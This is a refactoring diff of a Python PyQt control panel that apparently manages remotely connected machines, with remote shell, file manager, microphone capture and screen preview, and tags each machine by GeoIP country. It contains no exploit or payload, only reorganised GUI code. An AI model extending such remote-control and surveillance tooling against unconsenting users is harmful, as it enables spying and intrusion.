@@ -25,6 +25,25 @@ from plugins.mexplorer import main as mexplorer
 from plugins.mshell import main as mshell
 
 
+# initial geo ip database
+geo_ip_database = pygeoip.GeoIP('assets\\GeoIP.dat')
+
+# initial assets directories
+assets = os.path.join(os.getcwd(), 'assets\\')
+flags = os.path.join(assets, 'flags')
+temp_folder = os.path.join(os.getcwd(), 'tmp')
+if not os.path.exists(temp_folder):
+    os.mkdir(temp_folder)
+
+
+def get_ip_location(ip):
+    country_flag = os.path.join(flags, geo_ip_database.country_code_by_addr(ip).lower() + '.png')
+    if os.path.exists(country_flag):
+        return country_flag
+    else:
+        return os.path.join(flags, 'blank.png')
+
+
 def id_generator(size=16, chars=string.ascii_uppercase + string.digits):
     return ''.join(random.choice(chars) for _ in range(size))
 
@@ -58,15 +77,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # plugins bank
         self.pluginsBank = {}
         self.current_sock = ''
-
-        # initial geo ip database
-        self.geoip = pygeoip.GeoIP('assets\\GeoIP.dat')
-        # initial assets directories
-        self.assets = os.path.join(os.getcwd(), 'assets\\')
-        self.flags = os.path.join(self.assets, 'flags')
-        self.tmp = os.path.join(os.getcwd(), 'tmp')
-        if not os.path.exists(self.tmp):
-            os.mkdir(self.tmp)
 
         # disable panel buttons
         self.remoteShellButton.setDisabled(True)
@@ -173,9 +183,9 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.c.listen(128)
 
         # Start Servers Check Thread
-        serversCheckThread = threading.Thread(target=self.checkServers)
-        serversCheckThread.setDaemon(True)
-        serversCheckThread.start()
+        servers_check_start = threading.Thread(target=self.checkServers)
+        servers_check_start.setDaemon(True)
+        servers_check_start.start()
 
         while self.acceptthreadState:
             try:
@@ -231,14 +241,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                                 self.streaming_socks[i]['activewindowtitle'] = info['activewindowtitle']
                                 self.emit(SIGNAL('updateTable()'))
 
-                            elif mode == 'audioMode':
-                                self.signalAudio(self.sock)
-
-                            elif mode == 'shellMode':
-                                self.signalShell(self.sock)
-
-                            elif mode == 'explorerMode':
-                                self.signalExplorer(self.sock)
+                            self.send_run_signal(self.sock, mode)
 
                     except ValueError as e:
                         print e
@@ -295,7 +298,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 # add ip address & county flag
                 ip_address = self.socks[obj]['ip_address']
                 item = QTableWidgetItem(ip_address)
-                item.setIcon(QIcon(self.get_ip_location(ip_address)))
+                item.setIcon(QIcon(get_ip_location(ip_address)))
                 self.serversTable.setItem(index, self.index_of_ipAddress, item)
 
                 # add socket number
@@ -308,15 +311,15 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 item = QTableWidgetItem(lock_status)
                 if lock_status == 'LOCKED':
                     item.setTextColor(QColor('#e74c3c'))
-                    item.setIcon(QIcon(os.path.join(self.assets, 'lock.png')))
+                    item.setIcon(QIcon(os.path.join(assets, 'lock.png')))
                 else:
                     item.setTextColor(QColor('lime'))
-                    item.setIcon(QIcon(os.path.join(self.assets, 'unlock.png')))
+                    item.setIcon(QIcon(os.path.join(assets, 'unlock.png')))
                 self.serversTable.setItem(index, self.index_of_lock, item)
 
                 # add os version
                 item = QTableWidgetItem(self.socks[obj]['os'])
-                item.setIcon(QIcon(os.path.join(self.assets, os_icon(self.socks[obj]['ostype']))))
+                item.setIcon(QIcon(os.path.join(assets, os_icon(self.socks[obj]['ostype']))))
                 self.serversTable.setItem(index, self.index_of_os, item)
 
                 # add server user
@@ -338,13 +341,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
         # update servers online counter
         self.onlineStatus.setText(str(len(self.socks)))
-
-    def get_ip_location(self, ip):
-        country_flag = os.path.join(self.flags, self.geoip.country_code_by_addr(ip).lower() + '.png')
-        if os.path.exists(country_flag):
-            return country_flag
-        else:
-            return os.path.join(self.flags, 'blank.png')
 
     def unlock_server(self):
         while 1:
@@ -401,28 +397,28 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.unlockServerButton.setVisible(True)
             self.unlockServerButton.setDisabled(True)
             self.updatePreviewButton.setDisabled(True)
-            self.previewLabel.setPixmap(QPixmap(os.path.join(self.assets, 'monitor.png')).scaled(QSize(280, 175)))
+            self.previewLabel.setPixmap(QPixmap(os.path.join(assets, 'monitor.png')).scaled(QSize(280, 175)))
 
     def server_right_click_menu(self, point):
         server_index = self.serversTable.currentRow()
         self.eMenu = QMenu(self)
         self.optionsMenu = QMenu('Server Options', self)
-        self.optionsMenu.setIcon(QIcon(os.path.join(self.assets, 'settings.png')))
+        self.optionsMenu.setIcon(QIcon(os.path.join(assets, 'settings.png')))
 
         if self.serversTable.item(server_index, self.index_of_lock).text() == 'LOCKED':
-            self.eMenu.addAction(QIcon(os.path.join(self.assets, 'unlock.png')), 'Unlock Server', self.unlock_server)
+            self.eMenu.addAction(QIcon(os.path.join(assets, 'unlock.png')), 'Unlock Server', self.unlock_server)
 
         else:
-            self.eMenu.addAction(QIcon(os.path.join(self.assets, 'mshell.png')), 'Shell', self.runShell)
-            self.eMenu.addAction(QIcon(os.path.join(self.assets, 'mexplorer.png')), 'File Manager',
+            self.eMenu.addAction(QIcon(os.path.join(assets, 'mshell.png')), 'Shell', self.runShell)
+            self.eMenu.addAction(QIcon(os.path.join(assets, 'mexplorer.png')), 'File Manager',
                                  self.runExplorer)
-            self.eMenu.addAction(QIcon(os.path.join(self.assets, 'maudio.png')), 'Microphone', self.runAudio)
+            self.eMenu.addAction(QIcon(os.path.join(assets, 'maudio.png')), 'Microphone', self.runAudio)
 
             self.eMenu.addSeparator()
             self.eMenu.addMenu(self.optionsMenu)
-            self.optionsMenu.addAction(QIcon(os.path.join(self.assets, 'lock_2.png')), 'Lock Server',
+            self.optionsMenu.addAction(QIcon(os.path.join(assets, 'lock_2.png')), 'Lock Server',
                                        self.lock_server)
-            self.optionsMenu.addAction(QIcon(os.path.join(self.assets, 'stop.png')), 'Terminate Server',
+            self.optionsMenu.addAction(QIcon(os.path.join(assets, 'stop.png')), 'Terminate Server',
                                        self.lock_server)
         self.eMenu.exec_(self.serversTable.mapToGlobal(point))
 
@@ -437,13 +433,13 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
     def send_run_signal(self, sock, signal):
         signals = {
-            'shell': 'executeShell()',
-            'explorer': 'executeExplorer()',
-            'audio': 'executeAudio()',
+            'shellMode': 'executeShell()',
+            'explorerMode': 'executeExplorer()',
+            'audioMode': 'executeAudio()',
         }
         if signal in signals:
             self.current_sock = sock
-            self.emit(SIGNAL(signal))
+            self.emit(SIGNAL(signals[signal]))
 
     def execute_plugin(self, plugin):
         plugins = {
